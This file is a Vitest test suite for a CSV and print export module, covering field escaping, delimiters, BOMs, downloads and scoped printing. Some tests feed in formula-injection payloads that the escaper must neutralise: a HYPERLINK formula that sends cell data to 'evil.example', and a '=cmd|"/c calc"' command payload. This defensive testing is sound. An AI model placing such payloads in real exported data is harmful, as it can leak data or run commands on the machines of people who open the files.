import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  type CsvColumn,
  downloadCsv,
  escapeCsvValue,
  printElement,
  type ToCsvOptions,
  toCsv,
} from './export'

/** The UTF-8 byte order mark, spelled out so it is visible in this file. */
const BOM = '\uFEFF'

interface Row {
  name: string
  qty: number
  note?: string | null
}

const columns: CsvColumn<Row>[] = [
  { key: 'name', header: 'Name' },
  { key: 'qty', header: 'Qty' },
]

/** Rows of a single column, so assertions read as "the escaped field". */
function oneField(value: unknown, options?: ToCsvOptions<{ v: unknown }>): string {
  return toCsv([{ v: value }], [{ key: 'v', header: 'v' }], { header: false, ...options })
}

describe('escapeCsvValue', () => {
  it('leaves an ordinary value alone', () => {
    expect(escapeCsvValue('Ada')).toBe('Ada')
    expect(escapeCsvValue(42)).toBe('42')
    expect(escapeCsvValue(true)).toBe('true')
  })

  it('quotes a value containing the delimiter', () => {
    expect(escapeCsvValue('Lovelace, Ada')).toBe('"Lovelace, Ada"')
  })

  it('doubles embedded double quotes and quotes the field', () => {
    expect(escapeCsvValue('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvValue('"')).toBe('""""')
  })

  it('quotes a value containing LF or CRLF', () => {
    expect(escapeCsvValue('line1\nline2')).toBe('"line1\nline2"')
    expect(escapeCsvValue('line1\r\nline2')).toBe('"line1\r\nline2"')
  })

  it('does not quote a value containing a delimiter it is not using', () => {
    expect(escapeCsvValue('a,b', { delimiter: ';' })).toBe('a,b')
    expect(escapeCsvValue('a;b', { delimiter: ';' })).toBe('"a;b"')
    expect(escapeCsvValue('a\tb', { delimiter: '\t' })).toBe('"a\tb"')
  })

  it.each(['=', '+', '-', '@'])('guards the formula prefix %s', (prefix) => {
    expect(escapeCsvValue(`${prefix}1+1`)).toBe(`'${prefix}1+1`)
  })

  it('guards the whitespace formula prefixes a spreadsheet skips over', () => {
    // Tab and CR both get past Excel's leading-whitespace trim before it looks for `=`.
    expect(escapeCsvValue('\t=1+1')).toBe("'\t=1+1")
    expect(escapeCsvValue('\r=1+1')).toBe('"\'\r=1+1"')
  })

  it('guards a real-world injection payload', () => {
    const payload = '=HYPERLINK("http://evil.example/?leak="&A1,"Click me")'
    // Guarded, and quoted because it contains double quotes.
    expect(escapeCsvValue(payload)).toBe(
      '"\'=HYPERLINK(""http://evil.example/?leak=""&A1,""Click me"")"',
    )
  })

  it('guards a dangerous prefix that also needs quoting', () => {
    expect(escapeCsvValue('=1,2')).toBe('"\'=1,2"')
  })

  it('does not guard genuine numbers, booleans or dates', () => {
    expect(escapeCsvValue(-5)).toBe('-5')
    expect(escapeCsvValue(-0.5)).toBe('-0.5')
    expect(escapeCsvValue(10n)).toBe('10')
    expect(escapeCsvValue(new Date('2024-03-01T00:00:00.000Z'))).toBe('2024-03-01T00:00:00.000Z')
  })

  it('does guard a numeric-looking string, because it came from data', () => {
    expect(escapeCsvValue('-5')).toBe("'-5")
  })

  it('can have the guard turned off', () => {
    expect(escapeCsvValue('=1+1', { formulaGuard: false })).toBe('=1+1')
  })

  it('renders nullish as the configured text', () => {
    expect(escapeCsvValue(null)).toBe('')
    expect(escapeCsvValue(undefined)).toBe('')
    expect(escapeCsvValue(null, { nullish: 'n/a' })).toBe('n/a')
  })

  it('renders non-finite numbers and invalid dates as empty', () => {
    expect(escapeCsvValue(Number.NaN)).toBe('')
    expect(escapeCsvValue(Number.POSITIVE_INFINITY)).toBe('')
    expect(escapeCsvValue(new Date('nope'))).toBe('')
  })

  it('json-encodes an object rather than spraying delimiters', () => {
    expect(escapeCsvValue({ a: 1 })).toBe('"{""a"":1}"')
  })

  it('survives a circular object', () => {
    const circular: Record<string, unknown> = {}
    circular.self = circular
    expect(escapeCsvValue(circular)).toBe('')
  })
})

describe('toCsv', () => {
  const rows: Row[] = [
    { name: 'Ada', qty: 2 },
    { name: 'Grace', qty: 10 },
  ]

  it('writes a header row and CRLF line endings by default', () => {
    expect(toCsv(rows, columns)).toBe('Name,Qty\r\nAda,2\r\nGrace,10')
  })

  it('can drop the header row and change the newline', () => {
    expect(toCsv(rows, columns, { header: false, newline: '\n' })).toBe('Ada,2\nGrace,10')
  })

  it('writes only the header row for an empty data set', () => {
    expect(toCsv([], columns)).toBe('Name,Qty')
  })

  it('honours a custom delimiter, in the header as well as the body', () => {
    const withComma: Row[] = [{ name: 'Lovelace, Ada', qty: 1 }]
    const semicolon: CsvColumn<Row>[] = [
      { key: 'name', header: 'Full, name' },
      { key: 'qty', header: 'Qty' },
    ]
    // A comma is just text now, so neither field is quoted; a semicolon would be.
    expect(toCsv(withComma, semicolon, { delimiter: ';' })).toBe(
      'Full, name;Qty\r\nLovelace, Ada;1',
    )
    expect(toCsv([{ name: 'a;b', qty: 1 }], semicolon, { delimiter: ';', header: false })).toBe(
      '"a;b";1',
    )
  })

  it('writes a TSV with a tab delimiter', () => {
    expect(toCsv(rows, columns, { delimiter: '\t' })).toBe('Name\tQty\r\nAda\t2\r\nGrace\t10')
  })

  it('prepends a UTF-8 BOM on request', () => {
    expect(toCsv(rows, columns, { bom: true }).startsWith(BOM)).toBe(true)
    expect(toCsv(rows, columns, { bom: true })).toBe(`${BOM}Name,Qty\r\nAda,2\r\nGrace,10`)
    expect(toCsv(rows, columns).startsWith(BOM)).toBe(false)
  })

  it('escapes every field it writes', () => {
    const nasty: Row[] = [{ name: '=cmd|"/c calc"!A0', qty: 1 }]
    expect(toCsv(nasty, columns, { header: false })).toBe('"\'=cmd|""/c calc""!A0",1')
  })

  it('skips hidden columns unless asked', () => {
    const withHidden: CsvColumn<Row>[] = [...columns, { key: 'note', header: 'Note', hidden: true }]
    expect(toCsv(rows, withHidden)).toBe('Name,Qty\r\nAda,2\r\nGrace,10')
    expect(toCsv(rows, withHidden, { includeHidden: true })).toBe(
      'Name,Qty,Note\r\nAda,2,\r\nGrace,10,',
    )
  })

  it('falls back to the key when the header is not text, and lets csvHeader win', () => {
    expect(toCsv([], [{ key: 'qty', header: { type: 'svg' } }])).toBe('qty')
    expect(toCsv([], [{ key: 'qty', header: 'Qty', csvHeader: 'Quantity' }])).toBe('Quantity')
  })

  it('reads a computed column through sortAccessor, and csvValue wins over it', () => {
    const computed: CsvColumn<Row> = {
      key: 'label',
      header: 'Label',
      sortAccessor: (row) => `${row.name} x${row.qty}`,
    }
    expect(toCsv(rows, [computed], { header: false })).toBe('Ada x2\r\nGrace x10')
    expect(toCsv(rows, [{ ...computed, csvValue: () => 'fixed' }], { header: false })).toBe(
      'fixed\r\nfixed',
    )
  })

  it('runs formatValue before escaping', () => {
    const out = toCsv(rows, columns, {
      header: false,
      formatValue: (value) => (typeof value === 'number' ? `${value} units` : value),
    })
    expect(out).toBe('Ada,2 units\r\nGrace,10 units')
  })

  it('escapes a field even when formatValue produced the danger', () => {
    expect(oneField('safe', { formatValue: () => '=1+1' })).toBe("'=1+1")
  })

  it('exports missing properties as empty', () => {
    expect(oneField(undefined)).toBe('')
  })
})

describe('downloadCsv', () => {
  const createObjectURL = vi.fn(() => 'blob:vk-test')
  const revokeObjectURL = vi.fn()
  const original = { create: URL.createObjectURL, revoke: URL.revokeObjectURL }

  beforeEach(() => {
    // jsdom's own createObjectURL rejects a Node Blob, so it has to be replaced.
    Object.assign(URL, { createObjectURL, revokeObjectURL })
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    createObjectURL.mockClear()
    revokeObjectURL.mockClear()
    Object.assign(URL, { createObjectURL: original.create, revokeObjectURL: original.revoke })
  })

  it('clicks a download anchor and revokes the object URL', () => {
    const clicks: Array<{ href: string; download: string; attached: boolean }> = []
    const originalClick = HTMLAnchorElement.prototype.click
    HTMLAnchorElement.prototype.click = function click(this: HTMLAnchorElement) {
      clicks.push({
        href: this.href,
        download: this.download,
        attached: this.isConnected,
      })
    }

    try {
      expect(downloadCsv('rows.csv', 'a,b')).toBe(true)
    } finally {
      HTMLAnchorElement.prototype.click = originalClick
    }

    expect(clicks).toEqual([{ href: 'blob:vk-test', download: 'rows.csv', attached: true }])
    expect(createObjectURL).toHaveBeenCalledTimes(1)
    expect(revokeObjectURL).toHaveBeenCalledWith('blob:vk-test')
    // No leftover anchor in the document.
    expect(document.querySelectorAll('a[download]')).toHaveLength(0)
  })

  it('is a no-op, not a crash, when there is no document', () => {
    vi.stubGlobal('document', undefined)
    expect(downloadCsv('rows.csv', 'a,b')).toBe(false)
    expect(createObjectURL).not.toHaveBeenCalled()
  })

  it('is a no-op when the platform has no object URLs', () => {
    vi.stubGlobal('URL', { revokeObjectURL })
    expect(downloadCsv('rows.csv', 'a,b')).toBe(false)
  })
})

describe('printElement', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
    document.documentElement.removeAttribute('data-vk-printing')
  })

  it('is a no-op, not a crash, when there is no document', () => {
    vi.stubGlobal('document', undefined)
    expect(printElement(null)).toBe(false)
  })

  it('is a no-op for a null target or an empty ref', () => {
    expect(printElement(null)).toBe(false)
    expect(printElement(undefined)).toBe(false)
    expect(printElement({ current: null })).toBe(false)
  })

  it('scopes the print to one element and cleans up afterwards', () => {
    const element = document.createElement('div')
    document.body.append(element)

    let seen: { root: boolean; printing: boolean; title: string } | undefined
    const print = vi.fn(() => {
      seen = {
        root: element.hasAttribute('data-vk-print-root'),
        printing: document.documentElement.hasAttribute('data-vk-printing'),
        title: document.title,
      }
    })
    vi.stubGlobal('print', print)

    const onAfterPrint = vi.fn()
    expect(printElement(element, { documentTitle: 'Rows', onAfterPrint })).toBe(true)
    expect(print).toHaveBeenCalledTimes(1)
    expect(seen).toEqual({ root: true, printing: true, title: 'Rows' })

    // Browsers that report afterprint clean up there; the event is a no-op otherwise.
    window.dispatchEvent(new Event('afterprint'))
    expect(element.hasAttribute('data-vk-print-root')).toBe(false)
    expect(document.documentElement.hasAttribute('data-vk-printing')).toBe(false)
    expect(onAfterPrint).toHaveBeenCalledTimes(1)

    element.remove()
  })

  it('accepts a ref object', () => {
    const element = document.createElement('section')
    document.body.append(element)
    const print = vi.fn()
    vi.stubGlobal('print', print)

    expect(printElement({ current: element })).toBe(true)
    expect(print).toHaveBeenCalledTimes(1)

    window.dispatchEvent(new Event('afterprint'))
    element.remove()
  })

  it('reports false when the platform cannot print', () => {
    const element = document.createElement('div')
    document.body.append(element)
    vi.stubGlobal('print', undefined)

    expect(printElement(element)).toBe(false)
    // Cleaned up even though nothing printed.
    expect(element.hasAttribute('data-vk-print-root')).toBe(false)
    expect(document.documentElement.hasAttribute('data-vk-printing')).toBe(false)
    element.remove()
  })
})
